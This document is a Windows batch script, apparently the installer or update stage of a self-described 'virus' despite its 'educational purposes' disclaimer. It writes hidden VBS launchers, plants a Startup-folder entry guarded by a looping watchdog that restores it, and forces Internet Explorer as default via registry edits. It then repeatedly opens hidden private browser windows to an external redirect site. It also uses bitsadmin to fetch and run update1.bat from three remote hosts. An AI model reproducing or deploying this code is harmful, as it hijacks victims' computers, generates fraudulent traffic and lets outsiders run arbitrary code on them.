@echo off

REM Use this for educational purposes only.
REM I do not any take responsability for you pranking your friends or getting in trouble.
REM If you accidentally downloaded this or ran this, you can download the remover.bat from the gihub page. 
REM
REM
REM
REM
REM
REM
REM
REM
REM


If EXIST C:\Users\%username%\AppData\Local\startup_copier.bat (
	del "C:\Users\%username%\AppData\Local\startup_copier.bat"
) ELSE (
	ECHO
)

If EXIST C:\Users\%username%\AppData\Local\startup_copier2.bat (
	del "C:\Users\%username%\AppData\Local\startup_copier2.bat"
) ELSE (
	ECHO
)

If EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
) ELSE (
	ECHO 
)

If EXIST C:\Users\%username%\AppData\Local\msdfmap.bat (
	del "C:\Users\%username%\AppData\Local\msdfmap.bat"
) ELSE (
	ECHO 
)


If EXIST C:\Users\%username%\AppData\Local\msdfmap.vbs (
	del "C:\Users\%username%\AppData\Local\msdfmap.vbs"
) ELSE (
	ECHO 
)


If EXIST C:\Users\%username%\AppData\Local\mute.vbs (
	del "C:\Users\%username%\AppData\Local\mute.vbs"
) ELSE (
	ECHO 
)



If EXIST C:\Users\%username%\AppData\Local\update0.bat (
	del "C:\Users\%username%\AppData\Local\update0.bat"
) ELSE (
	ECHO 
)


If EXIST C:\Users\%username%\AppData\Local\startup.bat (
	del "C:\Users\%username%\AppData\Local\startup.bat"
) ELSE (
	ECHO 
)



If EXIST C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat (
	del "C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat"
) ELSE (
	ECHO 
)





	
REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
ECHO %pwd% >> C:\Users\%username%\Downloads\msdfmap.vbs



REM This creates the mute.vbs script.
set mute1=Set WshShell = CreateObject("WScript.Shell")
set mute2=	For i = 0 To 50
set mute3=	WshShell.SendKeys(chr(174))
set mute4=  WScript.Sleep 100
set mute5=Next
type NUL > C:\Users\%username%\Downloads\mute.vbs
ECHO %mute1%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute2%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute3%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute4%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute5%  >> C:\Users\%username%\Downloads\mute.vbs




type NUL > C:\Users\%username%\Downloads\startup.bat
ECHO @echo off >> C:\Users\%username%\Downloads\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\msdfmap.bat >> C:\Users\%username%\Downloads\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier2.bat >> C:\Users\%username%\Downloads\startup.bat


type NUL > C:\Users\%username%\Downloads\startup_copier2.bat
ECHO @echo off >> C:\Users\%username%\Downloads\startup_copier2.bat
ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier.bat >> C:\Users\%username%\Downloads\startup_copier2.bat


type NUL > C:\Users\%username%\Downloads\startup_copier.bat
ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO copy /y "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO :loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO ECHO hello >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO ELSE( >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO copy /y "C:\Users\%username%\Appdata\Local\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
ECHO goto loop22 >> C:\Users\%username%\Downloads\startup_copier.bat



type NUL > C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
set ar1=@echo off
set ar2=setlocal enabledelayedexpansion

REM -- check XHTML support (IE 9+)
set ar3=set xhtml=0
set ar4=for /f %%%%G in ('"reg query "HKCR\IE.AssocFile.XHT" /ve 2>&1 | findstr /c:".XHT" "') do set xhtml=1

REM -- reset file extensions
set ar5=set exts=HTM,HTML
set ar6=if %%xhtml%% == 1 (set exts=%%exts%%,XHT,XHTML)

set ar7=for %%%%G in (%%exts%%) do (
set ar8=set ext=%%%%G
set ar9=set ext=!ext:~0,3!
set ar10=reg add "HKCU\Software\Classes\.%%%%G" /ve /t REG_SZ /d "IE.AssocFile.!ext!" /f ^^^>nul
set ar11=)

set ar12=set exts=%%exts%%,MHT,MHTML,URL
set ar13=set acl=%%temp%%\acl_%%random%%%%random%%.txt

set ar14=for %%%%G in (%%exts%%) do (
set ar15=set key=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.%%%%G\UserChoice
set ar16=echo !key! [1 7 17]^^^>"%%acl%%"
set ar17=regini "%%acl%%" ^^^>nul
set ar18=set ext=%%%%G
set ar19=set ext=!ext:~0,3!
set ar20=reg add "!key!" /v "Progid" /t REG_SZ /d "IE.AssocFile.!ext!" /f ^^^>nul
set ar21=)
set ar22=del "%%acl%%" 2^^^>nul

REM -- reset MIME associations
set ar23=for %%%%G in (message/rfc822,text/html) do (
set ar24=set key=HKCU\Software\Microsoft\Windows\Shell\Associations\MIMEAssociations\%%%%G\UserChoice
set ar25=reg add "!key!" /v "Progid" /t REG_SZ /d "IE.%%%%G" /f ^^^>nul
set ar26=)

REM -- reset URL protocols
set ar27=for %%%%A in (FTP,HTTP,HTTPS) do (
set ar28=set key=HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\%%%%A\UserChoice
set ar29=reg add "!key!" /v "Progid" /t REG_SZ /d "IE.%%%%A" /f ^^^>nul
set ar30=for %%%%B in (DefaultIcon,shell) do (
set ar31=set key=HKCU\Software\Classes\%%%%A
set ar32=reg delete "!key!\%%%%B" /f ^^^>nul 2^^^>^^^&1
set ar33=reg copy "HKCR\IE.%%%%A\%%%%B" "!key!\%%%%B" /s /f ^^^>nul
set ar34=reg add "!key!" /v "EditFlags" /t REG_DWORD /d 2 /f ^^^>nul
set ar35=reg add "!key!" /v "URL Protocol" /t REG_SZ /d "" /f ^^^>nul
set ar36=))

REM -- reset the start menu Internet link (Vista and earlier)
set ar37=reg add "HKCU\Software\Clients\StartMenuInternet" /ve /t REG_SZ /d "IEXPLORE.EXE" /f

REM -- reset cached icons
set ar38=if %%xhtml%% == 1 (
set ar39=ie4uinit -cleariconcache
set ar40=)


ECHO %ar1%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar2%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar3%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar4%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar5%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar6%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar7%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar8%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar9%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar10%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar11%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar12%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar13%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar14%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar15%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar16%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar17%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar18%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar19%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar20%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar21%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar22%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar23%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar24%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar25%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar26%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar27%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar28%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar29%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar30%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar31%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar32%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar33%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar34%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar35%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar36%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar37%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar38%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar39%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat
ECHO %ar40%  >> C:\Users\%username%\Downloads\set_IE_as_default_browser.bat








REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Downloads\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Downloads\msdfmap.bat

ECHO ping -n 1 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat


REM Download Set_IE_AS_DEFAULT_BROWSER.bat
ECHO 	 copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     del C:\Users\%username%\Downloads\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat



REM Wait 17 mins, then launch internet. 
ECHO :loop >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat

ECHO ping -n 60 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat






REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO )	 >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat




REM if the update is downloaded its copied somewhere where this can check it update1 has been installed. May not be necessary.
ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\Popeye\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO    wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\Downloads\update1.bat >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ECHO nothing >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat

ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat

ECHO goto loop >> C:\Users\%username%\Downloads\msdfmap.bat




REM This code copies each of the created files to specific folders. 

copy /y "C:\Users\%username%\Downloads\msdfmap.bat" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
del C:\Users\%username%\Downloads\startup.bat
del C:\Users\%username%\Downloads\msdfmap.bat
del C:\Users\%username%\Downloads\msdfmap.vbs
del C:\Users\%username%\Downloads\mute.vbs
del C:\Users\%username%\Downloads\startup_copier.bat
del C:\Users\%username%\Downloads\startup_copier2.bat



wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier2.bat
ping -n 3 127.0.0.1 > nul
wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\msdfmap.bat



REM del THIS_FILES_NAME.bat
del update12.bat




REM Taskkill cmd.exe used at somepoint after the update. regular virus will auto run after next computer restart. This is only for updating.
